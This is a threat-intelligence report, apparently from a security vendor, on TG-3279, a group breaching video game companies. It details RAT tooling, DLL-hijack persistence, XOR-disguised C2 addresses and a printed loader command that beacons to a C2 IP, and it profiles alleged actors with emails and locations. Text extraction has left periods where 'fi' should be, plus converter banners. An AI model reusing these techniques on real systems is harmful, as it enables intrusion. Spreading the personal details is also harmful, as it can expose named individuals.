Summary 
Threat Group-3279[i] 
(TG-3279) targets the entertainment and video game industries. Based upon Portable 
Executable 
(PE) compile dates, domain name registrations, collection dates of tools, the threat actors' activity on message boards, and activity observed by Dell SecureWorks Counter Threat Unit™ (CTU™) researchers during incident response engagements, TG-3279 appears to have been active since 2009. 

CTU researchers believe that TG-3279 is associated with the China Cracking Group and that the Laurentiu Moon and Sincoder personas are TG-3279 actors. Due to information gathered from targeted hosts, CTU researchers believe with medium con.dence that TG-3279 focuses on the collection of video game source code to crack those games for free use, to develop tools to cheat at the games, or to use the source code for competing products. The best method for detecting TG-3279 activity is to look for modi.cations to system .les, invalidly signed executables, and repeated non-existent domain (NXDomain) DNS replies. 

Known tools 
The following tools are strong indicators of TG-3279 activity: 

Conpee — A modular plugin-based remote access trojan (RAT) framework that includes a "PlugMgr" component, which sometimes uses the .lenames mspatcher.dll or mspatch.dll. Newer variants of the Conpee installer include a semi-custom PE-.le loader. 

gsi.exe — A system pro.ling tool compiled by Laurentiu Moon. 

Etso 
— A tool that loads an executable remote access tool from multiple registry keys. 


Etso 
rootkit — A network and .le hiding rootkit. 


Runxx 
— A tool that loads PE .les from its .rsrc section. 



PDFgeneratedautomaticallybythePDFmyURLHTMLtoPDFAPIThe following tools, authored by Sincoder but also shared publicly, may indicate activity by TG-3279: 

s — A custom, fast SYN port scanner. 

sqlin.php — A PHP SQL injection script created on December 15, 2013. 

dnsenum.py — A Python script used to enumerate DNS entries from a word list. 

rdp_crk — A Python script and executable to brute force Remote Desktop Protocol (RDP) usernames and passwords. 

icmp_shell — A reverse shell that runs on Windows hosts over ICMP traf.c. 
Additional forked tool repositories in the Sincoder persona's GitHub repository include the following: 

Keylogger 
— A Linux kernel-based keylogger originally created by GitHub user "enaudon." 


Jynxkit 
— A Linux-based rootkit with a reverse-connecting SSL backdoor, originally created by GitHub user "Chokepoint." 


Gh0st 
— A common RAT. 


NetCommander 
— An Address Resolution Protocol (ARP)-spoo.ng tool. 


Carberp 
— A RAT that was popular years ago but is still in use. 


PDFgeneratedautomaticallybythePDFmyURLHTMLtoPDFAPITG-3279 has also been observed using popular public tools such as pwdump6. 
Tactics 
Through incident response engagements and open source research, CTU researchers have gained insight into TG-3279 operations. 

Reconnaissance 
TG-3279 appears to perform reconnaissance on its targets via open source research and network scanning. 

Development 
TG-3279 reuses some network infrastructure between attacks. Some IP addresses used by the threat actors are shared by multiple domain names. Not all domain names associated with those IP addresses are related to TG-3279 activity, and some may be non-malicious. The registration information for each domain name used by TG-3279 tends to be unique and sometimes uses famous names or names that appear to be intended as a joke. Much of the registration information is cloned from legitimate companies such as Google or Microsoft. 

Weaponization 
As of this publication, CTU researchers have not determined whether TG-3279 uses weaponization tools to 
package exploits with malware. 


Delivery 
It appears that TG-3279 uses a port scanning tool named "s" and an RDP brute force tool named "rdp_crk", which may be used to scan and exploit targets. 

Exploitation 
As of this publication, CTU researchers have not discovered packaged exploits used by TG-3279 and believe that the threat actors rely on active hands-on­keyboard techniques to exploit targets. 

Installation 
CTU researchers have observed TG-3279 leveraging optionally loaded DLLs to establish persistence for the Conpee plugin framework. This persistence technique allows threat actors to add a .le to the compromised host without modifying the Windows Registry or startup items. 
The optional DLL hijacking method used by TG-3279 placed the Conpee DLL .le on the compromised host as C:\Windows\wlbsctrl.dll. The Windows operating system includes an option to start the "IKE and AuthIP IPSec Keying Modules" service for load balancing if the host is con.gured to run this service. This system-privileged, network-enabled service is controlled via the ikeext.dll service DLL, which attempts to load wlbsctrl.dll. The legitimate version of this .le resides at C:\Windows\System32\wlbsctrl.dll. TG-3279 actors took advantage of the .le not existing on the host, and placed their DLL at C:\Windows\wlbsctrl.dll. The system loaded the .le at this location when it did not .nd the .le at the legitimate location. On typical Windows 7 and 2008 systems, failure to load wlbsctrl.dll is not reported. CTU researchers discovered that TG-3279 placed wlbsctrl.dll into C:\Windows\ and con.gured the "IKE and AuthIP IPSec Keying Modules" service to run. 

In other cases, TG-3279 actors modi.ed the imports of legitimate DLLs to add their malicious DLLs to the load process. For example, TG-3279 has modi.ed mspatcha.dll to import mspatcher.dll or msdomain.dll, both of which were the malicious Conpee DLL .le. When wuauserv.dll loads mspatcha.dll, the malicious .le is also loaded in the DLL import table. 
TG-3279 has been able to install tools in these locations by compromising the account credentials of users with administrator privileges. 

Command and control 
TG-3279 command and control (C2) communication often takes place over port 443 but is not HTTPS traf.c. The traf.c appears to be part of a larger framework that the tool's authors named PATX. The C2 communications include two notable aspects to complicate investigations: IP calculations and domain name parking. 
IP calculations 
TG-3279 actors have adopted a form of IP calculation to obfuscate the true 
PDFgeneratedautomaticallybythePDFmyURLHTMLtoPDFAPIend point of their communications. This method of transforming the retrieved IP address prevents detection by defenders who only resolve the hostnames used in the tools. For example, one of TG-3279's C2 hosts is www7 . micorsofts . com, which resolves to 230.165.22.199. In this instance, each byte of the IP address's hexadecimal value is XOR-transformed with the value 0x88, so the resulting network communications actually communicate to 110.45.158.79 (the result of 230 ^ 0x88 . 165 ^ 0x88 . 22 ^ 0x88 . 199 ^ 0x88). 
Domain name parking 
TG-3279 actors appear to park the domain names used by their tools on non-malicious IP addresses at different points in time to evade detection of the actual IP addresses used in operations. For www7 . micorosofts . org and login . 7unzip . org, TG-3279 removed the DNS resolution for the domains at least three and four times respectively while the tools were installed on compromised resources. 

Actions on objective 
In the operations observed by CTU researchers, TG-3279 maintained a long-lived foothold within in.ltrated organizations. CTU researchers have observed TG-3279 actors refreshing their implanted tools with newer versions, including versions that have been signed with valid certi.cates. 
Certi.cate signing 
PDFgeneratedautomaticallybythePDFmyURLHTMLtoPDFAPIWindows 7 checks executable .les for valid digital signatures from a set of trusted Certi.cate Authorities (CAs). Files containing a signature from one of these CAs can execute without prompting a user for permission. TG-3279 has been observed using legitimately signed .les on Windows 7 hosts. These .les were signed with a Chinese technology company's certi.cate on February 19, 2013, which is the same date that the .les were written on the compromised host. CTU researchers believe that TG-3279 compromised this signing certi.cate because it was revoked on Tuesday, August 28, 2012. If a compromised host has a current certi.cate revocation list (CRL), this signature is .agged as invalid. 
TG-3279 actors strive to access network and system administrators' accounts to gain the most access to the target organization. After initial exploitation, TG­3279 relies on a few key hosts (typically the hosts of system or network administrators, document repositories, and domain controllers) to act as beachheads running the Conpee or Etso tools. TG-3279 then adds scheduled system tasks to other key resources within an organization to use compromised credentials gathered from pwdump6. 


CTU observations 
During TG-3279 investigations, CTU researchers discovered evidence linking two personas, Laurentiu Moon Colonce and Sincoder, to TG-3279 tool development and infrastructure acquisition. TG-3279 activity has also revealed loose links to the Winnti 
group, but it is not clear as of this publication whether TG-3279 is part of Winnti. 
PDFgeneratedautomaticallybythePDFmyURLHTMLtoPDFAPIActor pro.le: Laurentiu Moon Colonce 
The .rst established persona related to the tools used by TG-3279 is Laurentiu Moon, which is found in the program database (PDB) string of the gsi.exe system pro.ling tool. The PDB stores debugging information for its program. The PDB string is included at compilation time and provides insight into the directory structure of the computer used to compile the executable. The gsi.exe example shown in Figure 1 illustrates the use of the "laurentiumoon" username on the originating host and shows that the original program was named "getosinfo". According to the PETimeDateStamp, this example was compiled on Sunday, October 30, 2011 at 16:42:30 UTC.

The Laurentiu Moon Colonce persona has many online pro.les that contain very little information, including a Steam Community online gaming account, a Google+ 
account, 
a 
list 
of 
CodeBeamer 
code 
projects, 
and 
a 
bulletin 
board 
account 
on 
a 
site 
about 
mobile 
phone 
jailbreaks 
and 
cracking. 
Additionally, 
the laurentiumoon @ gmail . com email address was used to register an account on rootkit.com, which used to be a bulletin board dedicated to discussing exploits and rootkit development. In February 2011, Anonymous dumped the clear text passwords of all rootkit.com users while compromising HBGary. There is also an openrce.org 
user 
account 
with the laurentiumoon username. OpenRCE is a popular reverse code engineering website that includes information on analyzing and building malicious software, as well as on reverse engineering and cracking legitimate software. 

Laurentiu Moon has also been active in the Chinese cracking and hacking underground since at least 2009, based upon the threat actor's join dates on the China 
Cracking 
Group 
online community, AntiGameProtect, and qdppc.net. The China Cracking Group and AntiGameProtect are online communities dedicated to cracking software digital rights management (DRM) mechanisms, with a large focus on video games. Laurentiu Moon joined AntiGameProtect on December 26, 2013 and has been active as recently as January 1, 2014 (see Figure 2).

Actor pro.le: Sincoder (2bcoder) 
Newer versions of the Conpee tool include a semi-custom PE loading method. This method is functionally equivalent to at least two projects on GitHub: a "sinpeloader" and a "PE-loader-sample." Additionally, some of the C2 domains used in TG-3279 operations have shared the same IP address as the hostname www . sincoder . com. CTU researchers discovered a GitHub account for a user named "sincoder," which was active as recently as December 31, 2013. 
The GitHub account followed and contributed to the following projects: 

PE-loader-sample — A PE-loader that is functionally equivalent to the semi-custom PE-loader found in the newer versions of Conpee. The original owner of this GitHub project is a member of the 3sLabs company, which is located in Bangalore, India. 

sinpeloader 
— The Sincoder pro.le's development branch of the PE-loader-sample project. 


jynxkit 
— A Linux rootkit. 


Multiple 
publicly available RATs, including Gh0st, LS4Ghost (the Linux server for Gh0st), Carberp, and NetCommander. 


Branches 
of other tools, including "keylogger," http_upload, sinarp (for ARP poisoning), "s" port scanner, icmp_shell to provide a remote shell over ICMP, UPX, and "nmap_scripts." 


The sincoder GitHub account includes the 2bcoder @ gmail . com email address. A related domain of 2bcoder . com is registered with the zhuxueao123 @ gmail.com email address. 
According 
to 
the 
sincoder account, the user is located in Shanghai, China. However, other evidence discussed below suggests this information may not be accurate. 

There is also a Weibo 
microblogging 
pro.le 
for a user named 2bcoder that references attending network security club meetings and has many Android mobile device posts with geolocation information tagging for the Nanshan District of Shenzhen. The Weibo account follows both the Wuhan University of Technology and the Wuhan University Jingwei Forum. 
Like Laurentiu Moon, Sincoder is also a member of the China Cracking Group. A Twitter 
account 
notes the persona's location as Shenzhen, China. The Twitter pro.le does not have many public posts but follows security industry Twitter accounts such as FireEye and SecurityTube, many penetration testers, and offensive-security Twitter accounts such as Nikita Tarajanov from Russia and a self-described "Botmaster, 
TrueCrober, 
CreditCardFucker, 
Fraudmaster" based in "cardaland" who posts in Russian. 
Based upon the geolocation data associated with Weibo posts, the Sincoder (2bcoder) threat actor appears to live near Kefa Road in the Nanshan District of the Guangdong Province in Shenzhen, China as of this publication, and may be af.liated with the Wuhan University of Technology. CTU researchers believe the individual is pursuing a career in the information security industry. Based upon the geolocation of older Weibo posts, Sincoder may have previously lived in Beijing's Dongcheng District.

Potential links to TG-2633 
In 2013, Kaspersky Lab produced a report 
on a group it named "Winnti" after one of the tools the group uses. The CTU research team refers to the Winnti group as TG-2633. The group targets video game companies and uses tools, techniques, and procedures similar to those used by TG-3279: 

Both 
groups have used executables signed with potentially compromised certi.cates. The use of malware signed with valid certi.cates is one technique used to circumvent protections included in recent versions of the Windows operating system. 


Both 
groups have used rootkits detected by antivirus (AV) vendors as "winnti." 


A 
Chinese technology company certi.cate that was used by TG-3279 was used to sign a separate rootkit that AV vendors detect as "Etso" or "winnti," which is associated with TG-2633. It is possible that the code base used to create these rootkits has been shared within the Chinese underground, leading to the same AV rule alerting on multiple tools, or that this compromised certi.cate has been shared with multiple threat groups. 


Both 
groups target the video game industry. However, video game companies appear to be common targets across the Chinese cracking community. 


Domain 
names used by the groups are loosely linked. TG-2633 uses a 7zbiz . org domain name, while TG-3279 uses a 7zunzip . com domain. These domains have similar names that are based on the legitimate 7zip 


PDFgeneratedautomaticallybythePDFmyURLHTMLtoPDFAPItool, but there is no other information to connect these domains. 

Both groups have used domain names based upon the Microsoft trademark; however, this is an extremely common emulation among malicious actors. 
Although CTU researchers believe a connection between TG-3279 and TG-2633 is probable, there is no direct evidence to de.nitively link the two groups. The following are possible relationships between the groups: 

The threat actors in the two groups may have an indirect relationship. 

TG-3279 threat actors may respect and emulate TG-2633, whose operating procedures were detailed in April 2013. 

Members of the groups may directly collaborate within the Chinese cracking community by sharing code, tools, and signing certi.cates. 

TG-3279 and TG-2633 may be part of the same overarching group. 


Conclusion 
TG-3279 actors have been observed compromising video game companies. The following practices could prevent or detect successful intrusions: 

Use 
host-based .le pro.ling to look for new DLL .les added to system directories and modi.cations to the imports of existing .les. 


Maintain 
current certi.cate revocation lists and alert on .les signed with revoked certi.cates. 


Monitor 
DNS lookup and alert on repeated NX-domains lookups. TG-3279 


PDFgeneratedautomaticallybythePDFmyURLHTMLtoPDFAPIoften "turns off" the domain names used by its RATs. 
CTU researchers believe with high con.dence that the individuals behind the Sincoder and Laurentiu Moon Colonce personas develop tools used by TG­3279. Based on the online associations of these personas, an objective of these compromises is likely to obtain inside information to crack the DRM protections of the stolen software and to develop cheat patches. An alternative objective may have been to obtain the source code of the gaming applications to develop a similar product. CTU researchers believe that TG-3279 will continue operations for the foreseeable future. Although there are similarities between TG-3279 and TG-2633, also known as Winnti, CTU researchers have not established a strong link between the groups as of this publication. 

Appendix A: Tools 
TG-3279 has been observed using the tools mentioned in the Known tools section. 
Conpee 
Conpee is part of the "PATX" framework. The PlugMgr component, which communications with the "PATX_SERVER" C2 host, offers a reasonably full range of backdoor functionality, including the ability to load plugins with further capabilities.

PDFgeneratedautomaticallybythePDFmyURLHTMLtoPDFAPITable 2. PlugMgr component interaction commands. 
Conpee includes limited error logging to a .le named %s/%s_date.log. 
In 2013, TG-3279 began using 64-bit custom packed versions of the Conpee PlugMgr. These .les are loaded via the XT load system described in the next section. 

XT load system 
TG-3279 uses a custom form of PE loading that includes multiple .les to load executable code from an INI .le. This XT code loading system is composed of four .les: gsi.exe, xt.bat, xt.tmp, and xt.ini. 
gsi.exe 
gsi.exe is an executable .le that walks the process tree to .nd explorer.exe. gsi.exe then saves the security identi.er (SID) for explorer.exe to c: \t.ini as the value of the private pro.le string "App". This value is then used by the xt.tmp executable .le. 
xt.bat 
xt.bat is a batch script that calls the xt.tmp and xt.ini components of the XT load system. The following is an example of xt.bat contents: 
c:\recovery\xt.tmp c:\recovery\xt.ini 
-c 192.69.198.6 -o 443 

xt.tmp 
xt.tmp is an executable .le that loads the data within xt.ini and c:\t.ini via the GetPrivatePro.le API call. 
xt.ini 
xt.ini is an INI .le that includes executable code within the "DATA" string. The hexadecimal characters within the DATA string decode to the data in Figure 3. 

Figure 3. Contents of the xt.ini .le. (Source: Dell SecureWorks) 
This routine decodes the imports for UPX from the obfuscated format in Figure 4 (four regular bytes followed by three garbage bytes), then repairs the enclosed UPX stub within the DATA string and loads this PE .le. To further obfuscate the INI .le from signature-based detections, the MZ header of the UPX PE .le is also nulli.ed, as shown in Figure 5. When loaded, xt.ini is the Conpee PlugMgr component.

PDFgeneratedautomaticallybythePDFmyURLHTMLtoPDFAPI
Etso 
The Etso tool used by TG-3279 is named TSMSISrv.dll. An older version of the code reads executable code data from four values in the HKLM\SOFTWARE\ODBC.INI registry key into memory buffers on the stack. The newer version of this tool, which was released February 2013 or earlier, reads the executable code from values stored in the non-malicious HKLM\SOFTWARE\ODBC\ODBC.INI registry path. When executed, the data loaded from the ODBC.INI values XOR-decodes a simple remote access tool that provides backdoor command execution access to the compromised host. 

Runxx.exe rsrc loader 
Runxx.exe is a custom loader that runs the .le encoded within the runxx.exe executable's .rsrc section as the owner of the Explorer.exe process. CTU researchers have observed the executable being named runxx.exe and st.exe. The st.exe version, which is slightly different from runxx.exe, takes the command line argument -P <key>, which decodes the enclosed .rsrc .le. On 32-bit Windows Vista and newer hosts, the .le writes and executes %TEMP%\w7??.tmp, where "??" is replaced with two random characters. On 64­bit Windows Vista and newer hosts, the .lename is %TEMP%\VX0??.tmp, where "??" is replaced with two random characters.
